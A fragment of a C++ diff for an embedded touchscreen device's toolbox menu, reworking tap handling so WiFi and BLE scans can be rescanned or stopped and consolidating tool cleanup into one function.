+    s_activeTool = ActiveTool::NONE;
+    s_level = ToolboxLevel::TOOL_RUNNING;
     return true;
 }
 
 static bool handleUtilTap(int idx) {
     if ((UtilTool)idx == UtilTool::BACK) { s_level = ToolboxLevel::CATEGORIES; s_scroll = 0; return true; }
-    stubToolRun(UTIL_LABELS[idx]);
+    s_toolActive = true;
+    s_activeTool = ActiveTool::NONE;
+    s_level = ToolboxLevel::TOOL_RUNNING;
     return true;
 }
 
-// ---- Public API ----
-
 bool uiToolboxHandleTap(TFT_eSPI& t, int16_t x, int16_t y, uint32_t now) {
-    // If a tool is running, any tap stops it
     if (s_level == ToolboxLevel::TOOL_RUNNING) {
-        uiToolboxStopTool();
+        // WiFi scan: tap to rescan when scan is done
+        if (s_activeTool == ActiveTool::WIFI_SCAN && !s_scanning) {
+            // Tap on bottom bar = stop, tap elsewhere = rescan
+            if (y > t.height() - 30) {
+                stopActiveTool();
+                s_level = ToolboxLevel::WIFI_TOOLS;
+                s_scroll = 0;
+            } else {
+                wifiScanStart();
+            }
+            return true;
+        }
+        // BLE scan: tap to rescan when done
+        if (s_activeTool == ActiveTool::BLE_SCAN && !s_bleScanning) {
+            if (y > t.height() - 30) {
+                stopActiveTool();
+                s_level = ToolboxLevel::BLE_TOOLS;
+                s_scroll = 0;
+            } else {
+                bleScanStart();
+            }
+            return true;
+        }
+        // Everything else: tap stops
+        stopActiveTool();
+        s_level = ToolboxLevel::CATEGORIES;
+        s_scroll = 0;
         return true;
     }
 
     const int menuTop = HEADER_H + ROW_PAD;
-    if (y < menuTop) return true;  // tapped header, ignore
+    if (y < menuTop) return true;
 
     int count = 0;
     labelsForLevel(s_level, count);
-
     const int row = (y - menuTop) / (ROW_H + ROW_PAD) + s_scroll;
     if (row < 0 || row >= count) return true;
-
     s_selected = row;
 
     switch (s_level) {
         case ToolboxLevel::CATEGORIES:
-            if ((ToolCategory)row == ToolCategory::BACK) return false;  // exit toolbox
+            if ((ToolCategory)row == ToolCategory::BACK) return false;
             handleCategoryTap(row);
             return true;
         case ToolboxLevel::WIFI_TOOLS: return handleWifiTap(row);
@@ -262,11 +786,7 @@ bool uiToolboxHandleTap(TFT_eSPI& t, int16_t x, int16_t y, uint32_t now) {
 bool uiToolboxToolRunning() { return s_toolActive; }
 
 void uiToolboxStopTool() {
-    if (s_toolActive) {
-        Serial.println("[toolbox] stopping active tool");
-        // TODO: actual cleanup — stop WiFi promiscuous mode, BLE advertising, etc.
-        s_toolActive = false;
-    }
+    stopActiveTool();
     s_level = ToolboxLevel::CATEGORIES;
     s_scroll = 0;
     s_selected = -1;
